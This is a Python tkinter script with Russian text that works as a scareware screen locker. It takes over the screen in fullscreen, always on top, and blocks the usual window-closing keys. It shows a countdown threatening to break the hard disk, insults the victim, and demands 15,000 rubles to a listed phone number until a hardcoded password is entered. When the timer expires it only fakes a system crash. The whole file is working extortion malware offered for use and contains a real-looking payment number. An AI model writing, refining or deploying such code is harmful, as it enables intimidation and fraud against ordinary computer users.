import tkinter as tk
from tkinter import messagebox
import time
import random
import sys

def disable_event():
    return "break"

def check_password():
    if password_entry.get() == "123456789":
        root.destroy()
        sys.exit()
    else:
        messagebox.showerror("Ошибка", "Ебать ты даун это неверный пароль!")
        password_entry.delete(0, tk.END)

def update_timer():
    global remaining_time
    if remaining_time > 0:
        mins, secs = divmod(remaining_time, 60)
        timer_label.config(text=f"{mins:02d}:{secs:02d}")
        remaining_time -= 1
        root.after(1000, update_timer)
        
        if remaining_time % 2 == 0:
            warning_label.config(fg='red')
        else:
            warning_label.config(fg='black')
        
        if remaining_time < 60:
            timer_label.config(fg=random.choice(['red', 'white', 'yellow']))
    else:
        timer_label.config(text="00:00", fg='red')
        warning_label.config(text="Ваш жесткий диск сломан!", fg='red')
        simulate_crash()

def simulate_crash():
    for _ in range(20):  # Уменьшил количество сообщений для производительности
        x = random.randint(0, root.winfo_screenwidth())
        y = random.randint(0, root.winfo_screenheight())
        error = tk.Label(root, 
                       text="SYSTEM ERROR", 
                       fg='white', 
                       bg='red', 
                       font=('Arial', random.randint(8, 20)))
        error.place(x=x, y=y)
        root.update_idletasks()  # Изменил на update_idletasks для стабильности

def update_system_files():
    system_files = [
        "kernel32.dll", "ntoskrnl.exe", "hal.dll", "win32k.sys",
        "explorer.exe", "svchost.exe", "csrss.exe", "smss.exe",
        "system32.dll", "user32.dll", "gdi32.dll", "advapi32.dll"
    ]
    current_file = random.choice(system_files)
    file_label.config(text=current_file)
    root.after(1500, update_system_files)

# Создаем главное окно
root = tk.Tk()
root.title(" ")

# Упростил настройки окна для стабильности
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
root.configure(bg='black')

# Блокировка сочетаний клавиш
root.protocol("WM_DELETE_WINDOW", disable_event)
for key in ['<Alt-F4>', '<Control-w>', '<Escape>']:
    root.bind(key, disable_event)

# Таймер (5 минут для теста)
remaining_time = 5 * 60

# Элементы интерфейса
timer_label = tk.Label(
    root,
    text="05:00",
    fg='red',
    bg='black',
    font=('Arial', 36, 'bold'),
    justify='center'
)
timer_label.pack(pady=(50, 0))

warning_label = tk.Label(
    root,
    text="По окончанию таймера ваш жесткий диск будет сломан",
    fg='red',
    bg='black',
    font=('Arial', 16, 'bold'),
    justify='center'
)
warning_label.pack(pady=(10, 30))

label = tk.Label(
    root,
    text="Поздравляем, вы далбоёб!\nСкидывайте мне 15 000р на этот номер: +7 914 267 24 91 сбер",
    fg='red',
    bg='black',
    font=('Arial', 24, 'bold'),
    justify='center'
)
label.pack(pady=(0, 30))

password_entry = tk.Entry(
    root,
    show="*",
    font=('Arial', 18),
    width=20
)
password_entry.pack(pady=(0, 20))

button = tk.Button(
    root,
    text="Проверить пароль",
    command=check_password,
    bg='black',
    fg='white',
    font=('Arial', 16),
    relief='flat'
)
button.pack()

# Рамка с системными файлами
file_frame = tk.Frame(
    root,
    bg='gray',
    bd=2,
    relief='groove'
)
file_frame.place(relx=0.98, rely=0.98, anchor='se')

file_label = tk.Label(
    file_frame,
    text="",
    fg='#00FF00',
    bg='black',
    font=('Courier New', 10),
    padx=10,
    pady=5
)
file_label.pack()

# Запускаем таймер и анимацию
update_timer()
update_system_files()

# Упрощенный контроль фокуса
def force_focus():
    root.focus_force()
    if not root.focus_displayof():  # Проверка, что окно еще существует
        return
    root.after(500, force_focus)  # Увеличил интервал для стабильности

force_focus()

root.mainloop()